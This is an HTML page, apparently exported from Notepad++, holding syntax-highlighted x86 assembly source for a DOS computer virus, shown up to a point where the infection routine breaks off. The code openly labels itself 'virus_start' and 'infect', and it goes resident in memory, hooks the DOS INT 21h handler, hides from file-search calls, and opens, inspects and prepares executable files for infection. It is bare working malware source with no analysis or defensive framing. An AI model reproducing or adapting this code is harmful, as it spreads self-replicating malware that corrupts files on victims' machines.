<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">mz</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0"> 
        </span><span class="sc5">mzSignature</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzExtraBytes</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzPages</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzRelocItems</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzHeaderSize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzMinAlloc</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzMaxAlloc</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzInitSS</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzInitSP</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzCheckSum</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzInitIP</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzInitCS</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzRelocTable</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">mzOverlay</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">dta</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0">
        </span><span class="sc5">dtaFill</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">dtaAttr</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">dtaTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">dtaSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc5">dtaName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     
</span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">max_fsize</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">50000</span><span class="sc0">
</span><span class="sc5">dec_size</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">vl</span><span class="sc4">+</span><span class="sc2">202</span><span class="sc4">+</span><span class="sc2">400</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">IntConst</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc0">

</span><span class="sc5">locals</span><span class="sc0"> </span><span class="sc5">__</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">save_all</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc2">.286</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">
      </span><span class="sc6">sti</span><span class="sc0">
      </span><span class="sc6">cld</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0"> 
</span><span class="sc5">install</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAFEh</span><span class="sc0">
      </span><span class="sc6">clc</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">exit</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3305h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0">   </span><span class="sc5">exit</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trace_int21</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">   </span><span class="sc5">exit</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vl</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_vl</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">exit</span><span class="sc0">   
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">             
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc12">'Z'</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vl</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc8">Ds</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">no_run</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">no_run</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">int_21</span><span class="sc0">
      </span><span class="sc6">Mov</span><span class="sc0">  </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2521h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">     

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">exit.inc</span><span class="sc0">

</span><span class="sc5">int_21</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAFEh</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_dead</span><span class="sc0">
      </span><span class="sc6">stc</span><span class="sc0">
      </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">no_dead</span><span class="sc4">:</span><span class="sc0">  
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_exit</span><span class="sc0">
</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_run</span><span class="sc0">
</span><span class="sc5">no_exit</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ch</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__exit</span><span class="sc0">  
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__exec</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_find_first</span><span class="sc0">
</span><span class="sc5">find_file</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find</span><span class="sc0"> 
</span><span class="sc5">no_find_first</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">find_file</span><span class="sc0"> 
</span><span class="sc5">__exec</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">_hehe</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004Bh</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_run</span><span class="sc0">
</span><span class="sc5">_hehe</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Init</span><span class="sc0">
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Cmp_Name</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">Err_Name</span><span class="sc0">      
      </span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">test_Rash</span><span class="sc0">
      </span><span class="sc6">Jc</span><span class="sc0">   </span><span class="sc5">Err_Name</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dec_size</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc5">IntConst</span><span class="sc0">    
      </span><span class="sc6">jc</span><span class="sc0">   </span><span class="sc5">Err_Name</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">buf_seg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">   
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc8">Dx</span><span class="sc0">
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">buf_seg</span><span class="sc0">  
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Err_Name</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">   
      </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Done</span><span class="sc0">  
</span><span class="sc5">no_run</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">sifilis</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int_21</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">use_it</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
</span><span class="sc5">__4</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">__4</span><span class="sc0">
</span><span class="sc5">__3</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3d42h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
      </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">
      </span><span class="sc6">Pop</span><span class="sc0">  </span><span class="sc8">Ds</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0"> 
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">b</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">
      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
      </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">$close</span><span class="sc0"> 
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exe_header</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
      </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">_close</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LostBytes_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0"> 
      </span><span class="sc6">lodsw</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LostBytes_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">72BAh</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">exe_filez</span><span class="sc0">  
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_end</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
      </span><span class="sc6">ja</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc5">$close</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">test_infect</span><span class="sc0">
</span><span class="sc5">$close</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc5">$close</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fsize1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">fsize2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> 
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_fsize</span><span class="sc0">
      </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">close</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4000</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">close</span><span class="sc0">
      </span><span class="sc1">; 512..fsize-(512+9)</span><span class="sc0">
      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">_$7</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
      </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
      </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">_$7</span><span class="sc0">
